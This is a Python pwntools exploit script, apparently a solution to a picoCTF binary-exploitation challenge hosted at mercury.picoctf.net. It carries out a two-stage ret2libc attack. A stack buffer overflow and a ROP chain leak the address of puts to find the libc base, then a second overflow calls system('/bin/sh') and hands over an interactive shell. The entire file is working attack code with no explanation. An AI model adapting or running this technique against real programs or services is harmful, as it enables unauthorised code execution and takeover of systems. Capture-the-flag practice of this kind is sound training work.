#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")
context.binary = exe
context.log_level='debug'
context.arch = 'amd64'
def conn():
    if args.LOCAL:
        r = gdb.debug([exe.path], 'b main')
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote('mercury.picoctf.net', 37289)

    return r


def main():
    r = conn()
    # stage 1
    r.recvline()
    payload = b'\x00'*(0x80 + 8)
    payload+= p64(0x400913) # pop rdi; ret
    payload+= p64(exe.got['puts'])
    payload+= p64(exe.plt['puts'])
    payload+= p64(exe.symbols['main'])
    r.sendline(payload)
    r.recvline()
    leak = u64(r.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak-libc.symbols['puts']
    success('puts: %s' %hex(leak))
    success('libc base : %s' % hex(libc.address))

    # stage 2
    r.recvline()
    payload = b'\x00'*(0x80 + 8)
    payload+= p64(0x40052e) # ret
    payload+= p64(0x400913) # pop rdi; ret
    payload+= p64(next(libc.search(b'/bin/sh\x00')))
    payload+= p64(libc.symbols['system'])
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
